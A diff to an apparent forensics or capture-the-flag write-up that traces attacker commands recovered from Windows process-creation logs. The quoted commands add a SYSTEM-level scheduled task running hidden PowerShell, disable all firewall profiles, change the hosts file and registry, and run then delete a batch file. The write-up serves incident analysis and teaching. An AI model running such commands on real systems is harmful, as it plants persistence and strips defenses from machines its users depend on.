@@ -104,7 +104,7 @@ Let's break it down:
 
 As we can see, there are a lot of commands executed, and we can trace them! Let's create a history of them (I've removed the useless lines):
 
-```PowerShell
+```bash
 rg -N "ADMIN\\$" 4688.csv | cut -d '|' -f8     
 cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
 cmd.exe /Q /c systeminfo 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
@@ -112,12 +112,12 @@ cmd.exe /Q /c cd /Users/Werni 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
 cmd.exe /Q /c cd MonitorHPC 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
 cmd.exe /Q /c type monitor.ps1 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
 cmd.exe /Q /c type known_hosts 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
-"cmd.exe /Q /c cmd /C ""echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"" 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1"
+cmd.exe /Q /c cmd /C ""echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"" 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
 cmd.exe /Q /c type C:\Windows\System32\drivers\etc\hosts 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
 cmd.exe /Q /c cd Appdata\local 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
-"cmd.exe /Q /c schtasks /create /tn ""SysHelper Update"" /tr ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1"" /sc minute /mo 2 /ru SYSTEM /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1"
+cmd.exe /Q /c schtasks /create /tn ""SysHelper Update"" /tr ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1"" /sc minute /mo 2 /ru SYSTEM /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
 cmd.exe /Q /c netsh advfirewall set allprofiles state off 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
-"cmd.exe /Q /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc"" /v Start /t REG_DWORD /d 3 /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1"
+cmd.exe /Q /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc"" /v Start /t REG_DWORD /d 3 /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
 cmd.exe /Q /c .\proxy.bat 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
 cmd.exe /Q /c rm .\proxy.bat 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
 cmd.exe /Q /c del .\proxy.bat 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
